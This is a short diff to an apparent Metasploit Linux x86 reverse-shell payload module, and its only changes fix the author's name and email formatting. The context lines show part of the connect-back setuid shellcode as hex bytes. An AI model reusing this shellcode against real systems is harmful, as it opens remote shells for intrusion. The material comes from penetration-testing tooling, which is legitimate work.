@@ -7,7 +7,7 @@ my $info =
     Name         => 'linx86reverse',
     Version      => '1.0',
     Description  => 'Connect back to attacker and spawn a shell',
-    Author       => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
+    Author       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
     Arch         => [ 'x86' ],
     Priv         => 0,
     OS           => [ 'linux' ],
@@ -43,7 +43,7 @@ sub Generate
     my $off_host = 19;
     my $host_bin = gethostbyname($host);
 
-    my $shellcode = # reverse connect setuid by hdm[at]metasploit.com
+    my $shellcode = # reverse connect setuid by hdm [at] metasploit.com
     "\x89\xe5\x31\xc0\x31\xdb\x43\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66".
     "\xcd\x80\x68\xc0\xa8\x00\xf7\x68\x02\x00\x22\x11\x89\xe1\x6a\x10".
     "\x51\x50\x89\xe1\x50\x31\xc0\xb0\x66\xb3\x03\xcd\x80\x85\xc0\x78".
